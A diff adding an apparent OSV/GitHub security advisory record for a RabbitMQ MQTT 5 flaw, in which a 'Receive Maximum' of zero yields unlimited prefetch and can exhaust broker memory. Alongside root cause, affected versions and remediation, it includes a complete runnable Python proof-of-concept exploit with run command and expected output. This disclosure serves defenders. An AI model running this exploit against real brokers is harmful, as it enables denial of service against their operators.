@@ -1,0 +1,63 @@
+{
+  "modified": "2026-08-18T03:08:49Z",
+  "published": "2026-08-18T03:08:48Z",
+  "schema_version": "1.5.0",
+  "id": "GHSA-4826-gphh-vw3x",
+  "details": "## Summary\r\n\r\nRabbitMQ accepts the MQTT 5 `Receive Maximum` CONNECT property with value zero,\r\nalthough MQTT 5 requires the server to treat zero as a malformed packet.\r\n\r\nRabbitMQ converts the value directly into `{simple_prefetch, 0}`. For classic\r\nqueues, zero means **unlimited prefetch**, not zero delivery credit. An\r\nauthenticated subscriber can therefore advertise zero, subscribe at QoS 1,\r\nread deliveries without sending PUBACK, and cause the broker's MQTT process and\r\nqueue acknowledgement state to grow without the configured MQTT prefetch bound.\r\n\r\nA control connection advertising `Receive Maximum = 1` receives exactly one\r\nQoS 1 message until it acknowledges it.\r\n\r\n## Preconditions\r\n\r\n- `rabbitmq_mqtt` or Web MQTT is enabled.\r\n- The attacker has valid credentials and permission to consume a topic.\r\n- Messages are available to the subscription at QoS 1.\r\n- The affected subscription uses a classic queue. Clean-start MQTT\r\n  subscriptions use classic queues in the verified configuration.\r\n\r\n## Root cause\r\n\r\n### 1. CONNECT parsing accepts zero\r\n\r\n```erlang\r\n%% deps/rabbitmq_mqtt/src/rabbit_mqtt_packet.erl:350-351\r\nparse_prop(\u003c\u003c16#21, Val:16, Bin/binary\u003e\u003e, ?CONNECT = Type, Props) -\u003e\r\n    parse_prop(Bin, Type, Props#{'Receive-Maximum' =\u003e Val});\r\n```\r\n\r\nNo guard rejects `Val = 0`.\r\n\r\n### 2. Zero becomes effective prefetch\r\n\r\n```erlang\r\n%% deps/rabbitmq_mqtt/src/rabbit_mqtt_processor.erl:295-302\r\nprefetch(Props) -\u003e\r\n    ReceiveMax = maps:get('Receive-Maximum', Props, ?TWO_BYTE_INTEGER_MAX),\r\n    min(rabbit_mqtt_util:env(prefetch), ReceiveMax).\r\n```\r\n\r\nWith `mqtt.prefetch = 10`, a client value of zero produces zero.\r\n\r\n### 3. Classic queues interpret zero as unlimited\r\n\r\nThe MQTT consumer is created with:\r\n\r\n```erlang\r\nmode =\u003e {simple_prefetch, Prefetch}\r\n```\r\n\r\nAt `Prefetch = 0`, `rabbit_queue_consumers` does not install a limiting credit\r\nrecord. QoS 1 deliveries continue while the MQTT processor tracks packet IDs\r\nand waits for PUBACK.\r\n\r\nQuorum queues treat zero differently and can stop delivery, but this does not\r\nprotect classic MQTT subscription queues.\r\n\r\n## Basic Python proof of concept\r\n\r\nAttachment: `mqtt-receive-maximum-zero-poc.py`\r\n\r\nThe attachment is one Python 3 file using only the standard library.\r\n\r\nTarget configuration:\r\n\r\n```ini\r\n# rabbitmq.conf\r\nmqtt.prefetch = 10\r\n```\r\n\r\nEnable MQTT and create any ordinary user with permission to consume and publish\r\nin the target vhost:\r\n\r\n```bash\r\nrabbitmq-plugins enable rabbitmq_mqtt\r\n```\r\n\r\nRun the PoC against that server:\r\n\r\n```bash\r\npython3 mqtt-receive-maximum-zero-poc.py \\\r\n  --host rabbitmq.example --port 1883 \\\r\n  --user poc --password pocpass \\\r\n  --messages 1000\r\n```\r\n\r\nThe script connects two raw MQTT 5 subscribers:\r\n\r\n- control: `Receive Maximum = 1`;\r\n- attack: forbidden `Receive Maximum = 0`.\r\n\r\nBoth subscribe at QoS 1 and deliberately send no PUBACK. A third connection\r\npublishes 20 control messages and 1,000 attack messages. A vulnerable server\r\nprints:\r\n\r\n```text\r\n{\r\n  \"receive_maximum_1_deliveries_without_puback\": 1,\r\n  \"receive_maximum_0_deliveries_without_puback\": 1000,\r\n  \"attack_messages_published\": 1000\r\n}\r\nVULNERABLE\r\n```\r\n\r\n### Independent Docker validation evidence\r\n\r\nThe same wire sequence was independently run against stock RabbitMQ 4.3.4:\r\n\r\n```text\r\nRabbitMQ 4.3.4\r\n\r\ncontrol:\r\n  Receive Maximum: 1\r\n  published QoS 1: 20\r\n  received without PUBACK: 1\r\n\r\nattack:\r\n  Receive Maximum: 0\r\n  published QoS 1: 1000\r\n  received without PUBACK: 1000\r\n\r\nPASS: Receive Maximum zero exceeded configured broker prefetch\r\nPASS: Receive Maximum zero delivered at least 90% without PUBACK\r\nASSERTIONS_OK\r\nPing succeeded\r\n```\r\n\r\nMQTT QoS acknowledgements are tracked inside `rabbit_mqtt_processor`, so\r\nmanagement queue `messages_unacknowledged` can remain zero even while the MQTT\r\nclient has 1,000 QoS 1 deliveries awaiting PUBACK. The wire-level control\r\ndirectly demonstrates the credit bypass.\r\n\r\n## Impact\r\n\r\n- The attacker can make unsettled delivery state grow far beyond both the\r\n  client-advertised receive limit and the configured broker MQTT prefetch.\r\n- Repeating the flow with sustained publishing can exhaust broker memory.\r\n- RabbitMQ's memory alarm can stop new publishers but does not reclaim existing\r\n  unsettled MQTT state.\r\n- The attack requires authentication and an opt-in MQTT listener, but no\r\n  administrator privileges.\r\n\r\n## Recommended remediation\r\n\r\n- Reject MQTT 5 CONNECT packets with `Receive Maximum = 0` using the required\r\n  malformed-packet reason code.\r\n- Validate duplicate and out-of-range Receive Maximum properties.\r\n- Never map an invalid client credit value to RabbitMQ's unlimited-prefetch\r\n  sentinel.\r\n- Bound per-connection unsettled MQTT state independently of queue prefetch.\r\n- Add zero-value tests for classic, quorum, native MQTT, and Web MQTT paths.\r\n\r\n```py\r\n#!/usr/bin/env python3\r\n\"\"\"RabbitMQ MQTT 5 Receive Maximum zero PoC (standard library only).\"\"\"\r\n\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport json\r\nimport socket\r\nimport struct\r\nimport threading\r\nimport time\r\n\r\n\r\ndef varint(value: int) -\u003e bytes:\r\n    out = bytearray()\r\n    while True:\r\n        byte = value \u0026 0x7F\r\n        value \u003e\u003e= 7\r\n        out.append(byte | (0x80 if value else 0))\r\n        if not value:\r\n            return bytes(out)\r\n\r\n\r\ndef read_varint(sock: socket.socket) -\u003e int:\r\n    value, multiplier = 0, 1\r\n    for _ in range(4):\r\n        byte = sock.recv(1)[0]\r\n        value += (byte \u0026 0x7F) * multiplier\r\n        if not byte \u0026 0x80:\r\n            return value\r\n        multiplier *= 128\r\n    raise ValueError(\"invalid MQTT varint\")\r\n\r\n\r\ndef mqtt_string(value: str | bytes) -\u003e bytes:\r\n    raw = value.encode() if isinstance(value, str) else value\r\n    return struct.pack(\"\u003eH\", len(raw)) + raw\r\n\r\n\r\ndef packet(sock: socket.socket, timeout: float = 10) -\u003e tuple[int, bytes]:\r\n    sock.settimeout(timeout)\r\n    kind = sock.recv(1)[0] \u003e\u003e 4\r\n    size = read_varint(sock)\r\n    body = bytearray()\r\n    while len(body) \u003c size:\r\n        body.extend(sock.recv(size - len(body)))\r\n    return kind, bytes(body)\r\n\r\n\r\ndef connect(\r\n    host: str,\r\n    port: int,\r\n    client_id: str,\r\n    user: str,\r\n    password: str,\r\n    receive_maximum: int | None,\r\n) -\u003e socket.socket:\r\n    properties = (\r\n        b\"\" if receive_maximum is None\r\n        else b\"\\x21\" + struct.pack(\"\u003eH\", receive_maximum)\r\n    )\r\n    variable = (\r\n        mqtt_string(\"MQTT\")\r\n        + b\"\\x05\\xc2\"\r\n        + struct.pack(\"\u003eH\", 60)\r\n        + varint(len(properties))\r\n        + properties\r\n    )\r\n    body = variable + mqtt_string(client_id) + mqtt_string(user) + mqtt_string(password)\r\n    sock = socket.create_connection((host, port), timeout=10)\r\n    sock.sendall(b\"\\x10\" + varint(len(body)) + body)\r\n    kind, connack = packet(sock)\r\n    if kind != 2 or len(connack) \u003c 2 or connack[1] != 0:\r\n        raise RuntimeError(f\"CONNECT rejected: kind={kind}, body={connack.hex()}\")\r\n    return sock\r\n\r\n\r\ndef subscribe(sock: socket.socket, topic: str) -\u003e None:\r\n    body = b\"\\x00\\x01\\x00\" + mqtt_string(topic) + b\"\\x01\"  # packet 1, QoS 1\r\n    sock.sendall(b\"\\x82\" + varint(len(body)) + body)\r\n    kind, _ = packet(sock)\r\n    if kind != 9:\r\n        raise RuntimeError(\"expected SUBACK\")\r\n\r\n\r\nclass NoPubackReader(threading.Thread):\r\n    def __init__(self, sock: socket.socket) -\u003e None:\r\n        super().__init__(daemon=True)\r\n        self.sock = sock\r\n        self.count = 0\r\n\r\n    def run(self) -\u003e None:\r\n        while True:\r\n            try:\r\n                kind, _ = packet(self.sock, 1)\r\n                if kind == 3:  # PUBLISH: deliberately do not send PUBACK\r\n                    self.count += 1\r\n            except (TimeoutError, socket.timeout):\r\n                continue\r\n            except (ConnectionError, OSError, IndexError):\r\n                return\r\n\r\n\r\ndef publish(sock: socket.socket, topic: str, count: int) -\u003e None:\r\n    for number in range(1, count + 1):\r\n        packet_id = ((number - 1) % 65_535) + 1\r\n        body = (\r\n            mqtt_string(topic)\r\n            + struct.pack(\"\u003eH\", packet_id)\r\n            + b\"\\x00\"\r\n            + f\"message-{number}\".encode()\r\n        )\r\n        sock.sendall(b\"\\x32\" + varint(len(body)) + body)\r\n        kind, _ = packet(sock)\r\n        if kind != 4:\r\n            raise RuntimeError(\"expected PUBACK from broker\")\r\n\r\n\r\ndef main() -\u003e int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"127.0.0.1\")\r\n    parser.add_argument(\"--port\", type=int, default=1883)\r\n    parser.add_argument(\"--user\", required=True)\r\n    parser.add_argument(\"--password\", required=True)\r\n    parser.add_argument(\"--messages\", type=int, default=1000)\r\n    args = parser.parse_args()\r\n\r\n    one = connect(args.host, args.port, \"poc-max-one\", args.user, args.password, 1)\r\n    zero = connect(args.host, args.port, \"poc-max-zero\", args.user, args.password, 0)\r\n    subscribe(one, \"poc/receive-max-one\")\r\n    subscribe(zero, \"poc/receive-max-zero\")\r\n    one_reader, zero_reader = NoPubackReader(one), NoPubackReader(zero)\r\n    one_reader.start()\r\n    zero_reader.start()\r\n\r\n    publisher = connect(\r\n        args.host, args.port, \"poc-publisher\", args.user, args.password, None\r\n    )\r\n    publish(publisher, \"poc/receive-max-one\", 20)\r\n    publish(publisher, \"poc/receive-max-zero\", args.messages)\r\n\r\n    deadline = time.time() + 15\r\n    while zero_reader.count \u003c args.messages and time.time() \u003c deadline:\r\n        time.sleep(0.1)\r\n\r\n    result = {\r\n        \"receive_maximum_1_deliveries_without_puback\": one_reader.count,\r\n        \"receive_maximum_0_deliveries_without_puback\": zero_reader.count,\r\n        \"attack_messages_published\": args.messages,\r\n    }\r\n    print(json.dumps(result, indent=2))\r\n\r\n    vulnerable = one_reader.count == 1 and zero_reader.count \u003e 10\r\n    print(\"VULNERABLE\" if vulnerable else \"NOT_REPRODUCED\")\r\n    return 0 if vulnerable else 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())\r\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.2.0"
+            },
+            {
+              "fixed": "4.2.10"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "DHI",
+        "name": "rabbitmq",
+        "purl": "pkg:dhi/rabbitmq"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "4.3.0"
+            },
+            {
+              "fixed": "4.3.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source_ecosystem": "other",
+        "source_package": "rabbitmq-server"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-4826-gphh-vw3x"
+    }
+  ]
+}
